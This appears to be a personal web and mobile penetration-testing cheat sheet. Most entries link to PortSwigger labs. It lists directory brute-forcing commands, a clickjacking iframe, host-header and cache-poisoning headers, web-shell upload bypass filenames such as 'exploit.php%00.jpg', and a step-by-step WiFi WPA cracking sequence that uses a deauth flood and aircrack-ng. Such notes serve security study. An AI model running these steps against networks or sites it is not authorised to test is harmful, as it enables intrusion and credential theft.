# CIA
	Integrity : data only change by auth.
	Avalability : Avalable data when user need.
	Confidentility : Data access by auth.
  
# Containt Discover
	dirb https://domain.com/ /usr/share/wordlists/dirb/big.txt
	gobuster -u http://fakebank.com -w wordlist.txt dir 
		
# directory Traversal
	dirb https://domain.com/ /usr/share/wordlists/wfuzz/vulns/dirTraversal-nix.txt
	
# ClickJacking
https://numberless-holddown.000webhostapp.com/clickjacking.php?url={url}
or
		
		<!DOCTYPE html>
		<html lang="en">
		<head>
		  <meta charset="UTF-8">
		</head>
		<body>
		  <iframe src="{url}" frameborder="0"></iframe>
		</body>
		</html>

# Host Header Poisoning
## Basic
	Change "Host" header 

## via middleware (for password reseting)
	Add X-Forwarded-Host: <domain.com>
https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware
	
## via dangling markup
	Try "Host: domain.com" to "Host: domain.com:attacker.com"
https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup

# Web Caches Poisioning
## Via an unkeyed header
	This lab supports the X-Forwarded-Host header. 
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header
	
## Via an unkeyed cookie
	change cookies value.
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie
	
## Via multiple headers
	Add:
		X-Forwarded-Scheme:http
		X-Forwarded-Host: example.com
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers
	
# RCE
## Basic
	Upload Php File
	
## via Content-Type restriction bypass
	Change "Content-Type" header
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass
	
## via path traversal
	Change file name "test.php" to "..%2ftest.php"
https://www.youtube.com/watch?v=4R3PUhiFzS4
	
## via obfuscated file extension
	change file name filename="exploit.php%00.jpg"
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension
	
## via race condition
https://www.youtube.com/watch?v=mt0BN5pYHXI </br>
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition
	
# No Rate Limit
## via brute force
	send request to intruder
## via Race Condition
	Send request to turbo
	add "race.py" payload
	add "test: %s" header in header



# Android Apk VAPT
## Insecure-data-storage
	find savedpref crenditial using adb
https://www.youtube.com/watch?v=x8keYIWFzbY
https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage

## BACKUP FLAG TRUE ENABLED
	go to AndroidManifest.xml and search "backup" if backup is not found or may be its true thats means its  vulnerable
	
## Exploiting Apps vulnerable to Janus (CVE-2017–13156)
A serious vulnerability in Android allows attackers to inject a DEX file into an APK file without affecting the signatures. (i.e. modify the code in applications without affecting their signatures.) </br>
We use apksigner tool to find the signature schemes used by the application</br>
	apksigner verify -verbose h5.apk
	
https://medium.com/mobis3c/exploiting-apps-vulnerable-to-janus-cve-2017-13156-8d52c983b4e0


# Wifi Password Hacking
	

	Step 1:

	Put your wireles lan card on monitor mode

	 airmon-ng start "wireless lan card name"
	=> airmon-ng start wlan0

	Step 2:

	Capture Traffic with Airodump-ng

	airodump-ng "wireless lan card monitor mode"

	=> airodump-ng wlan0mon


	Step 3:

	Focus airodump-ng on one AP on One Channel

	 airodump-ng --bssid dummy -c dummy --write WPAcrack wlan0mon

	=> airodump-ng --bssid 8C:FD:18:88:79:68 -c 9 --write WPAcrack wlan0mon


	Step 4:

	in order to capture the encrypted password we need to have the client authenticate against AP.
	we do deauth signal to client

	 aireplay-ng --deauth 1000 -a bssid wlan0mon

	=> aireplay-ng --deauth 1000 -a 8C:FD:18:88:79:68 wlan0mon


	Step 5:

	Now we have to crack the dump file with aircrack-ng

	 aircrack-ng WPAcrack-01.cap -w (localtion of wordlist)
